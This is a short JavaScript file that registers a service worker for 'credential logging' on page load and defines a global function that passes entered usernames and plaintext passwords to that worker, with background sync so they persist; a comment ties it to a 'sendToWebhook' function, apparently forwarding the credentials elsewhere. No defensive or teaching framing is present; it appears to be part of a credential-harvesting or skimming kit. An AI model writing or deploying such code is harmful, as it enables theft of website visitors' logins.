// Register the service worker for credential logging
(function() {
    function registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/js/credential-service-worker.js')
                .then(function(registration) {
                    console.log('Service Worker registered with scope:', registration.scope);
                    
                    // Set up communication with the service worker
                    setupServiceWorkerCommunication();
                })
                .catch(function(error) {
                    console.error('Service Worker registration failed:', error);
                });
        }
    }
    
    function setupServiceWorkerCommunication() {
        // Update the sendToWebhook function in credential-logger.js
        window.sendCredentialToServiceWorker = function(username, password) {
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'LOG_CREDENTIAL',
                    username: username,
                    password: password
                });
                
                // Also try to register a sync event
                navigator.serviceWorker.ready.then(function(registration) {
                    registration.sync.register('sync-credentials')
                        .catch(function(error) {
                            console.error('Sync registration failed:', error);
                        });
                });
            }
        };
    }
    
    // Register when the page loads
    window.addEventListener('load', registerServiceWorker);
})(); 